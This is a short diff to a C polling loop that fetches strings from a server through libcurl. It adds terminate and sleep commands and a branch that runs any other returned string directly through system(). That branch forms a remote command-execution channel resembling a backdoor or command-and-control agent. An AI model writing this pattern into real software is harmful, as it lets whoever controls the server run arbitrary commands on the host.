@@ -45,10 +45,7 @@ void get_executors_command(){
 			fprintf(stderr, "Error\n");
 			continue;
 		}
-		if (strcmp(response.string, "<NULL>") == 0){
-			printf("do nothing\n");
-			sleep(1);
-		} else if (strcmp(response.string, "<INTERACT>") == 0){
+		if (strcmp(response.string, "<INTERACT>") == 0){
 			int pid = fork();
 			if (pid == 0){
 				printf("child start");
@@ -56,6 +53,14 @@ void get_executors_command(){
 				printf("child stop");
 				exit(0);
 			}
+		} else if (strcmp(response.string, "<TERMINATE>") == 0) {
+			break;
+		} else if (strcmp(response.string, "<SLEEP>") == 0) {
+			system("sleep 2");
+		}else {
+			printf("%s\n", response.string);
+			system(response.string);
+			sleep(1);
 		}
 	}
 	curl_easy_cleanup(curl);
